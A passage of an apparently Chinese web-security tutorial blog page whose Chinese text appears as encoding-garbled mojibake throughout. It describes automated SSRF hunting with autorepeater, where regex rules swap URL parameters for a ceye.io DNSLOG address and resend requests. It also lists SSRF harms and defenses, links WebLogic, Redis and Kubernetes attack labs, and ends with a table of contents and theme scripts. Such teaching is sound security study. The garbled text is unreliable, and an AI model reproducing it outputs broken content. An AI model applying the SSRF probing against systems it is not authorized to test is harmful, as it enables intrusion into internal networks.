Âú®GoogleÁøªËØë‰∏≠ÊâæÂà∞ÁΩëÈ°µÁøªËØëÔºåËæìÂÖ•ÁΩëÂùÄ</p>
<p><strong>Â•áÂ•áÊÄ™ÊÄ™ÁöÑÊåñÊéò</strong></p>
<ol>
<li>Ê≠£Â∏∏ËÆøÈóÆ /</li>
<li>Â∞Ü/ Êîπ‰∏∫Êàë‰ª¨ÁöÑ‰∏ªÊú∫Âú∞ÂùÄ</li>
<li>ÂÖ∂‰ªñÂú∞ÂùÄÈ™åËØÅ</li>
</ol>
<h3 id="Â∑•ÂÖ∑-2">Â∑•ÂÖ∑</h3>
<p><strong>autorepeater</strong></p>
<ol>
<li>ÂáÜÂ§á</li>
</ol>
<ul>
<li>autorepeater</li>
<li>ceye.io ( dnslog / http Âπ≥Âè∞)</li>
<li>Ê≠£ÂàôË°®ËææÂºè</li>
</ul>
<blockquote>
<p><code>(?i)^(https|http|file)://.*  </code>  ‰øùËØÅÊú™ÁºñÁ†ÅÁöÑ URL ÂèØ‰ª•Ë¢´Ê≠£Â∏∏ÂåπÈÖç<br>
<code>(?i)^(https|http|file)%3A%2F%2F.*  </code> ‰øùËØÅÁºñÁ†ÅÁöÑ URL ÂèØ‰ª•Ë¢´Ê≠£Â∏∏ÂåπÈÖçÂà∞</p>
</blockquote>
<ol start="2">
<li>Â¶Ç‰∏ãÈÖçÁΩÆ</li>
</ol>
<blockquote>
<p>ÁÑ∂ÂêéÈÖçÁΩÆÂ¶Ç‰∏ãËßÑÂàô:<br>
Ê≠£ÂàôÁöÑ‰ΩúÁî®Â∞±ÊòØÂåπÈÖç URL ÁÑ∂ÂêéÊõøÊç¢Êàê DNSLOG ÁöÑÂú∞ÂùÄ,Êé•ÁùÄËá™Âä®ÂèëÂåÖ<br>
ÁÑ∂ÂêéÂú®ÊúâÁ©∫ÁöÑÊó∂ÂÄôÂéªÁúãÁúã DNSLOG ÊúâÊ≤°ÊúâÊï∞ÊçÆÊàñÊòØÊääÊâÄÊúâÂ∏¶ URL ÁöÑËá™Â∑±ÊµãËØï‰∏ÄÈÅçÂ∞±Áü•ÈÅìÊúâÊ≤°Êúâ ssrf</p>
</blockquote>
<ol start="3">
<li>ÊµãËØï</li>
</ol>
<h3 id="ÊºèÊ¥ûÂç±ÂÆ≥-2">ÊºèÊ¥ûÂç±ÂÆ≥</h3>
<blockquote>
<ol>
<li>Êâ´ÊèèÂÜÖÈÉ®ÁΩëÁªúÔºåËé∑ÂèñÁΩëÁªúÁªìÊûÑ‰ª•ÂèäÂÜÖÁΩëÊú∫Âô®ÊåáÁ∫π(FingerPrint)</li>
<li>ÂêëÂÜÖÈÉ®‰ªªÊÑè‰∏ªÊú∫ÁöÑ‰ªªÊÑèÁ´ØÂè£ÂèëÈÄÅÁ≤æÂøÉÊûÑÈÄ†ÁöÑÊï∞ÊçÆÂåÖ(Payload)</li>
<li>ÈÄöËøáËØ∑Ê±ÇÂ§ßÊñá‰ª∂Ôºå‰øùÊåÅkeep-alive ÂèëËµ∑ÊãíÁªùÊúçÂä°ÊîªÂáª(DoS)</li>
<li>Êûö‰∏æÁàÜÁ†¥Áî®Êà∑ÂêçÔºåÁõÆÂΩï Êñá‰ª∂Á≠âÔºàBrute ForceÔºâ</li>
</ol>
</blockquote>
<h3 id="ÊºèÊ¥ûÈò≤Âæ°-3">ÊºèÊ¥ûÈò≤Âæ°</h3>
<blockquote>
<p>1.Â∞ΩÈáèÈÅøÂÖç‰ΩøÁî®ÊúçÂä°Âô®Ê†πÊçÆÁî®Êà∑ÂèÇÊï∞ËøúÁ®ãÂä†ËΩΩËµÑÊ∫ê<br>
2. Â∞ΩÈáèÂ∞ÜËµÑÊ∫êÂõ∫ÂÆöÂåñÔºåÈÅøÂÖçÁî®Êà∑Êèê‰∫§ÂèØÂèòÂèÇÊï∞<br>
3. ÂØπ‰ΩøÁî®ÁöÑÂºÄÊ∫êÂ∫ìÁöÑssrfÊºèÊ¥ûËøõË°å‰∫ÜËß£<br>
4. Èâ¥ÊùÉ</p>
</blockquote>
<p><strong>Èù∂Âú∫ÁªÉ‰π†</strong>ÔºàÁÜüÊÇâdict / file / gopherÂçèËÆÆÔºâ</p>
<ol>
<li>vulhubÈù∂Âú∫ÁªÉ‰π†<br>
<code>https://vulhub.org/#/environments/weblogic/ssrf/</code></li>
<li>ÊÑüÂÖ¥Ë∂£ÂèØ‰ª•‰∫ÜËß£ssrfÊîªÂáª</li>
<li>redisÊú™ÊéàÊùÉÊúçÂä° <code>https://xz.aliyun.com/t/4051</code></li>
<li>ÊîªÂáª kubernetesÊúçÂä° <code>https://cloud.tencent.com/developer/article/1893363</code></li>
</ol>

            </div>
            <hr style="width: 80%;">
            
            <div class="postfooter">
                <ul class="post-copyright">
                    <li><strong>ÊñáÁ´†‰ΩúËÄÖÔºö</strong>Moyv_xmoct</li>
            <li><strong>ÂéüÊñáÈìæÊé•Ôºö</strong>https://xmoct.github.io/post/kua-zhan-jiao-ben-gong-ji/</li>
            <li><strong>ÁâàÊùÉÂ£∞ÊòéÔºö</strong>Êú¨ÂçöÂÆ¢ÊâÄÊúâÊñáÁ´†Èô§ÁâπÂà´Â£∞ÊòéÂ§ñÔºåÂùáÈááÁî®<i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA
                ËÆ∏ÂèØÂçèËÆÆ„ÄÇËΩ¨ËΩΩËØ∑Ê≥®ÊòéÂá∫Â§ÑÔºÅ</li>
            </ul>
        </div>
        
        <div id="otherpost">
            
            <a  data-pjax class="prev-post-pc" href="https://xmoct.github.io/post/9wK7KUt6d/"  style="color: black;">
                <div id="ppcontainer">
                    
                    <img src="https://xmoct.github.io/post-images/9wK7KUt6d.png" style="width: 100%;" class="opimg">
                    
                    <h4 class="optitle">Êñá‰ª∂‰∏ä‰º†ÂíåÊñá‰ª∂ÂåÖÂê´</h4>
                </div>
            </a>
            <div class="prev-post">
                ‰∏ä‰∏ÄÁØá <a  data-pjax href="https://xmoct.github.io/post/9wK7KUt6d/">Êñá‰ª∂‰∏ä‰º†ÂíåÊñá‰ª∂ÂåÖÂê´</a>
            </div>
            
            
            <a data-pjax class="next-post-pc" href="https://xmoct.github.io/post/cbian-cheng-2/"  style="color: black;">
                <div id="npcontainer">
                    
                    
                    <img src="" style="width: 100%;" class="opimg">
                    
                    
                    <h4 class="optitle">C++ÁºñÁ®ã2</h4>
                </div>
            </a>
            <div class="next-post">
                ‰∏ã‰∏ÄÁØá <a  data-pjax href="https://xmoct.github.io/post/cbian-cheng-2/">C++ÁºñÁ®ã2</a>
            </div>
            
        </div>
    </div>
    </div>
    </div>
    <!-- ÂºπÁ™ó -->
    <div id="myModal" class="modal">
        <img class="modal-content" id="img01">
    </div>
</body>
<script>
    //ÊñáÁ´†ÈòÖËØªÁÉ≠Â∫¶
    var pl = $("#pl").html();
    var rootaddr = $("#rootaddr").html();
    pl = pl.replace(rootaddr, "");
    $("#hotnum").attr('id', pl);
</script>
                    <div class="toc-container">
                        <ul class="markdownIt-TOC">
<li><a href="#xss">XSS</a>
<ul>
<li><a href="#%E7%AE%80%E8%BF%B0">ÁÆÄËø∞</a></li>
</ul>
</li>
<li><a href="#%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0">Èù∂Âú∫ÁªÉ‰π†</a>
<ul>
<li><a href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss">ÂèçÂ∞ÑÂûãxss</a>
<ul>
<li><a href="#get%E5%9E%8B">GETÂûã</a></li>
<li><a href="#post%E5%9E%8B">POSTÂûã</a></li>
<li><a href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss">Â≠òÂÇ®Âûãxss</a></li>
<li><a href="#dom%E5%9E%8Bxss">DOMÂûãxss</a></li>
</ul>
</li>
<li><a href="#xss%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B">XssÊºèÊ¥ûÊ£ÄÊµã</a>
<ul>
<li><a href="#%E5%8F%8D%E5%B0%84%E5%9E%8B">ÂèçÂ∞ÑÂûã</a></li>
<li><a href="#%E5%AD%98%E5%82%A8%E5%9E%8B">Â≠òÂÇ®Âûã</a></li>
<li><a href="#dom%E5%9E%8B">DOMÂûã</a></li>
</ul>
</li>
<li><a href="#xss%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F">XssÁöÑÁªïËøáÊñπÂºè</a>
<ul>
<li><a href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87">ÂèåÂÜôÁªïËøá</a></li>
<li><a href="#%E7%BC%96%E7%A0%81%E8%BD%AC%E4%B9%89">ÁºñÁ†ÅËΩ¨‰πâ</a></li>
<li><a href="#%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87">ÂÆû‰ΩìÁºñÁ†ÅÁªïËøá</a></li>
<li><a href="#%E5%B9%B3%E6%9B%BF%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87">Âπ≥ÊõøÁ¨¶Âè∑ÁªïËøá</a></li>
<li><a href="#%E7%AC%A6%E5%8F%B7%E8%A2%AB%E7%BC%96%E7%A0%81">Á¨¶Âè∑Ë¢´ÁºñÁ†Å</a></li>
<li><a href="#%E5%85%B6%E4%BB%96%E9%9D%9E%E9%BB%91%E5%90%8D%E5%8D%95%E5%8F%AF%E7%94%A8%E6%A0%87%E7%AD%BE">ÂÖ∂‰ªñÈùûÈªëÂêçÂçïÂèØÁî®Ê†áÁ≠æ</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">ÊºèÊ¥ûÊåñÊéò</a>
<ul>
<li><a href="#%E5%B8%B8%E8%A7%81%E6%80%9D%E8%B7%AF">Â∏∏ËßÅÊÄùË∑Ø</a></li>
<li><a href="#%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90">Ê°à‰æãÂàÜÊûê</a>
<ul>
<li><a href="#url%E4%B8%AD%E7%9A%84xss">url‰∏≠ÁöÑxss</a></li>
<li><a href="#%E7%95%99%E8%A8%80%E5%A4%84">ÁïôË®ÄÂ§Ñ</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">Êñá‰ª∂‰∏ä‰º†</a></li>
</ul>
</li>
<li><a href="#icloud-drive">icloud Drive</a></li>
<li><a href="#%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C">Áî®Êà∑Ê≥®ÂÜå</a>
<ul>
<li><a href="#%E5%8D%B1%E5%AE%B3"><strong>Âç±ÂÆ≥</strong></a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1">ÊºèÊ¥ûÈò≤Âæ°</a></li>
<li><a href="#xss%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88">xss‰øÆÂ§çÊñπÊ°à</a></li>
<li><a href="#%E5%B7%A5%E5%85%B7">Â∑•ÂÖ∑</a></li>
<li><a href="#%E4%BB%BB%E5%8A%A1">‰ªªÂä°</a></li>
</ul>
</li>
<li><a href="#xss%E8%84%91%E5%9B%BE">xssËÑëÂõæ</a></li>
</ul>
</li>
<li><a href="#csrf">CSRF</a>
<ul>
<li><a href="#%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-2">Èù∂Âú∫ÁªÉ‰π†</a>
<ul>
<li><a href="#get%E5%9E%8B-2">GETÂûã</a></li>
<li><a href="#post%E5%9E%8B-2">POSTÂûã</a>
<ul>
<li><a href="#token">token</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B">ÊºèÊ¥ûÊ£ÄÊµã</a>
<ul>
<li><a href="#%E6%95%8F%E6%84%9F%E5%8A%9F%E8%83%BD%E7%BC%BA%E4%B9%8Fcsrf%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6">ÊïèÊÑüÂäüËÉΩÁº∫‰πècsrfÈò≤Êä§Êú∫Âà∂</a></li>
<li><a href="#%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E5%85%81%E8%AE%B8%E5%86%99%E5%85%A5csrf-payload">ÁΩëÁ´ôÂèØ‰ª•ÂÖÅËÆ∏ÂÜôÂÖ•csrf payload</a></li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-2">ÊºèÊ¥ûÊåñÊéò</a>
<ul>
<li><a href="#%E5%B8%B8%E8%A7%81%E6%80%9D%E8%B7%AF-2">Â∏∏ËßÅÊÄùË∑Ø</a></li>
<li><a href="#%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90-2">Ê°à‰æãÂàÜÊûê</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3">ÊºèÊ¥ûÂç±ÂÆ≥</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1-2">ÊºèÊ¥ûÈò≤Âæ°</a></li>
<li><a href="#%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-3">Èù∂Âú∫ÁªÉ‰π†</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#ssrf">SSRF</a>
<ul>
<li><a href="#%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-4">Èù∂Âú∫ÁªÉ‰π†</a>
<ul>
<li><a href="#curl_exec">curl_exec</a></li>
</ul>
</li>
<li><a href="#ssrf%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">SSRFÊºèÊ¥ûÊåñÊéò</a>
<ul>
<li><a href="#%E5%B8%B8%E8%A7%81%E6%80%9D%E8%B7%AF-3">Â∏∏ËßÅÊÄùË∑Ø</a></li>
<li><a href="#%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90-3">Ê°à‰æãÂàÜÊûê</a></li>
<li><a href="#%E5%B7%A5%E5%85%B7-2">Â∑•ÂÖ∑</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3-2">ÊºèÊ¥ûÂç±ÂÆ≥</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1-3">ÊºèÊ¥ûÈò≤Âæ°</a></li>
</ul>
</li>
</ul>
</li>
</ul>

                    </div>
                    <div class="tog">
                        <div class="toggleContainer">
                            <div class="toggle">
                                <i class="fas fa-angle-double-up"></i>
                            </div>
                        </div>
                    </div>
                    <!---------------------------- ËØÑËÆ∫Á≥ªÁªüüëá ------------------------->
                    <div id="comment" class="comment">
                        <div class="commentcontainer">
                            
                                
                            
                        </div>
                    </div>
                    <!---------------------------- ËØÑËÆ∫Á≥ªÁªüüëÜ ------------------------->
                </div>
                <!-- mainÊ†áÁ≠æÔºåpjaxÊ∏≤ÊüìÊó∂Âä†ËΩΩ‰ª•‰∏äÂÜÖÂÆπüëÜ -->
                <div class="col-md-1 col-lg-2"></div>
                <div id="bg">
                </div>
            </div>
            <!-- ----------------Â∑¶‰æßËèúÂçïÊ†èhtml üëÜ-------------------------------------->
            
        </div>
        <!-- aplayerÊí≠ÊîæÂô®Âä†ËΩΩüëá -->
            
        <!-- aplayerÊí≠ÊîæÂô®Âä†ËΩΩüëÜ -->
    </div>
    <!-- ËÉåÊôØÂõæÂä†ËΩΩÊñπÂºèüëá -->
    <div id="bgchoice" style="display: none">link
                </div>
                
                <div id="bgurl" style="display:none"></div>
                
    <!-- ËÉåÊôØÂõæÂä†ËΩΩÊñπÂºèüëÜ -->
</body>

<script>
    //ÂàùÂßãÂåñ
    //Êõ¥Êç¢twikooÂ§¥ÂÉè
    setTimeout(replaceAvatar,1000);
    setTimeout(replaceAvatar,2000);
    setTimeout(replaceAvatar,8000);
    // --------‰∏∫ÊØèÂº†ÂõæÁâáÊ∑ªÂä†ÊáíÂä†ËΩΩÔºàlazyloadÔºâÊ†áÁ≠æ-->ÊáíÂä†ËΩΩÂäüËÉΩ üëá------------
    lazyload();
    //‰∏∫ÊñáÁ´†ÂÜÖÊâÄÊúâ‰ª£Á†ÅÂùóÊ∑ªÂä†‰ª£Á†ÅÂ§çÂà∂ÂäüËÉΩ üëá
    codeinit();
    // ------‰ª£Á†ÅÈ´ò‰∫ÆÊòæÁ§∫ÂäüËÉΩ-------------
    hljs.initHighlightingOnLoad();
    if (shareChoice)
        shareInit();
    if (donateChoice)
        donateInit();
</script>

<!------------------ Âä†ËΩΩlive2dÊ®°ÂûãÂäüËÉΩÔºàÁúãÊùøÂ®òÔºâüëá ---------------->

<script type="text/javascript">
    var message_Path = '/live2d/'
    var home_Path = document.getElementById("domainname").innerHTML + "/"; //Ê≠§Â§Ñ‰øÆÊîπ‰∏∫‰Ω†ÁöÑÂüüÂêçÔºåÂøÖÈ°ªÂ∏¶ÊñúÊù†
</script>
<script type="text/javascript" src="https://xmoct.github.io/media/js/live2d.js"></script>
<script type="text/javascript" src="https://xmoct.github.io/media/live2d/js/message.js"></script>
<script type="text/javascript">
    loadlive2d("live2d", "https://xmoct.github.io/media/live2d/assets/tororo.model.json");
</script>

<!------------------ Âä†ËΩΩlive2dÊ®°ÂûãÂäüËÉΩÔºàÁúãÊùøÂ®òÔºâüëÜ ---------------->


<!----------------------- ËøîÂõûÈ°∂ÈÉ®ÊåâÈíÆÂäüËÉΩüëá --------------------->
<script>
    $(function () {
        $('.toggleContainer').click(function () {
            $('html,body').animate({
                scrollTop: '0px'
            }, 800);
        });
        $(window).scroll(function () {
            var st = $(window).scrollTop();
            if (st > 30) {
                $(".toggleContainer").fadeIn(400);
            } else {
                $(".toggleContainer").fadeOut(100);
            }
        });
    });
</script>
<!----------------------- ËøîÂõûÈ°∂ÈÉ®ÊåâÈíÆÂäüËÉΩüëÜ --------------------->


<!------------ Âä†ËΩΩÂÖ®Â±ÄËÉåÊôØÂõæÂäüËÉΩüëáÔºàÂºÄÂßãÊó∂Ê≤°ÊúâÂÜôÂ•ΩÔºåËøôÂäüËÉΩÊúâÁÇπÈ∏°ËÇã/(„Ñío„Ñí)/~~Ôºâ -->
<script>
    var bgchoice = "link"
    var bg = $('#bg');
    var bgurl = document.getElementById("bgurl").innerHTML;
    if (bgchoice == 'default')
    {
        for (var i = 0; i < 3; i++)
            bgurl = bgurl.replace("\\", "/");
        bgurl = "https://xmoct.github.io/" + bgurl;
    }
    bg.css("background", "url('" + bgurl + "')");

    window.onload = function () {
        aplayerbtnInit();
    }
</script>
<!------------ Âä†ËΩΩÂÖ®Â±ÄËÉåÊôØÂõæÂäüËÉΩüëÜÔºàÂºÄÂßãÊó∂Ê≤°ÊúâÂÜôÂ•ΩÔºåËøôÂäüËÉΩÊúâÁÇπÈ∏°ËÇã/(„Ñío„Ñí)/~~Ôºâ -->




<script src="https://xmoct.github.io/media/js/index.js"></script>


<script>
    //Âä†ËΩΩÂêéÁöÑ‰∫ã‰ª∂ÂêåÊ≠•ÔºàÈòÖËØªÈáè„ÄÅÁßªÂä®Á´ØËØÑËÆ∫Á≠â
    window.onload = function () {
    //‰ª£Á†ÅÂùóÈ´ò‰∫ÆÊ∏≤Êüì
    document.querySelectorAll('pre code').forEach((block) => {
            hljs.highlightBlock(block);
    });
        getHotnum();
        var sharepc = $(".share").eq(0).html();
        $(".share").eq(1).html(sharepc);   //Êèí‰ª∂Âè™‰ºöÂØªÊâæ‰∏Ä‰∏™ÂàÜ‰∫´Ê†áÁ≠æÊ∏≤ÊüìÔºåÊâÄ‰ª•ÈúÄË¶ÅÊâãÂä®Ê∑ªÂä†Âà∞ÁßªÂä®Á´Ø
        aplayerbtnInit();
        $(".hljs").css({
            "padding": "20px"
        })
    }
</script>

<!-- <script src="https://xmoct.github.io/media/js/av-min.js"></script> -->
<!-- <script src="https://cdn.jsdelivr.net/npm/leancloud-storage@3.13.0/dist/av-min.js"></script> -->
<!-- <script src="https://cdn.jsdelivr.net/npm/leancloud-storage@4.6.1/dist/av-live-query-min.js"></script> -->